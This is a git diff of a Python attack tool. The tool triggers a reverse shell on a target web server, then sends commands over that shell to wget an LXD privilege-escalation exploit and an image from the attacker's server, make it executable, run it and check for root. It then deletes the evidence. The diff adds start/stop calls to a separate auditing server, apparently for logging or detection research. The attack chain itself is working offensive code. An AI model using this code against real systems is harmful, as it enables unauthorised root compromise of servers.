@@ -1,7 +1,7 @@
 import socket, sys, time, os, requests, datetime, re, random, errno
 import threading
 
-def listen(ip,port, t2, r_port, file_name):
+def listen(ip,port, t2, r_port, file_name, general_info):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind((ip, port))
 	s.listen(1)
@@ -19,8 +19,19 @@ def listen(ip,port, t2, r_port, file_name):
 		print('[+] Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
 		print('[+] Waiting for connection')
 		time.sleep(0.5)
-		commands = ['wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
-		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami && pwd\n'] #'rm -f {r_port}_file.tar.gz exploit.sh\n'.format(r_port=r_port)]
+		print('[DEBBUG] wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name))
+		print('[DEBBUG] wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port))
+		
+		start = "\n"
+		if general_info['active'] == 'True':
+			start = 'wget \'' + informAudittingStart(general_info) + '\'"$(echo $$)"' + ' -O /dev/null\n'
+		print('[DEBBUG]', general_info['active'], type(general_info['active']))
+		print('[DEBBUG]', general_info['active'] == 'True', general_info['active'] == "True", general_info['active'] == 'True' +"")
+		print('[DEBBUG]', start)
+			
+		commands = [start, '''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }')
+''','wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
+		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami && pwd\n'] 
 		for cmd in commands:
 			ans = recvall(conn)
 			sys.stdout.write(ans)
@@ -70,13 +81,13 @@ def listen(ip,port, t2, r_port, file_name):
 		if conn:
 			print('\n[-] Unbinding...')
 			# Cleanup
-			cleanup(conn, file_name)
+			cleanup(conn, file_name, general_info)
 			time.sleep(0.2)
 			conn.close()
 			s.close()
 	conn.close()
         
-def listen_shell(ip, port, v_ip, v_port):
+def listen_shell(ip, port, v_ip, v_port, general_info):
 	r_port = random.randint(1024, 65536)
 	# Making sure the random port is not in use
 	while check_port(ip, r_port):
@@ -85,7 +96,7 @@ def listen_shell(ip, port, v_ip, v_port):
 	t1 = threading.Thread(target=task, args=(v_ip, v_port))
 	t2 = threading.Thread(target=task2, args=(ip, r_port))
 	t1.start()
-	listen(ip, int(port), t2, r_port, get_file_name())
+	listen(ip, int(port), t2, r_port, get_file_name(), general_info)
 	
 def task(v_ip, v_port):
 
@@ -95,6 +106,7 @@ def task(v_ip, v_port):
 	if os.path.exists('./tmp_file_with_dest_url.txt'):
 		f = open('./tmp_file_with_dest_url.txt', 'r')
 		url = 'http://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
+		f.close()
 		print('[*] Making request to execute reverse shell ', url)
 		# Make the timeout very low in order not to wait for response
 		# Make the exception pass so that the user does not get an error 
@@ -159,9 +171,42 @@ def recvall(sock):
     return data
 
 
-def cleanup(conn, file_name):
-	conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force'.encode())
+def cleanup(conn, file_name, general_info):
+	conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force;'.encode())
+	print('[DEBBUG] ' + 'wget -O /dev/null \'' + informAudittingStop(general_info) + '\'"$(ps aux | grep www-data | grep "sh -i" | awk \'{print $2 }\' | sed -n 2p)"')
+	try:
+		requests.get('http://'+ informAudittingStop(general_info) + '3232', timeout=(1,1)) # Pid here doenst really matter
+	except requests.exceptions.ReadTimeout:
+	    		pass
+	except requests.exceptions.ConnectTimeout:
+	    	sys.exit('[-] Failed to connect to Logging server')
 	if os.path.exists(file_name):
 		os.remove(file_name)
 	if os.path.exists('build-alpine'):
 		os.remove('build-alpine')
+
+
+def informAudittingStart(general_info):
+	exploit = ''
+	match int(general_info['exploit']):
+		case 1:
+			exploit = 'LXD'
+		case default:
+			return ""
+	# Pid is added on the terminal using $(echo $$)
+	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit + '&pid='
+	return url
+
+def informAudittingStop(general_info):
+	exploit = ''
+	match int(general_info['exploit']):
+		case 1:
+			exploit = 'LXD'
+		case default:
+			return ""
+	# Pid is added on the terminal using $(echo $$)
+	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit + '&pid='
+	return url
+
+
+		
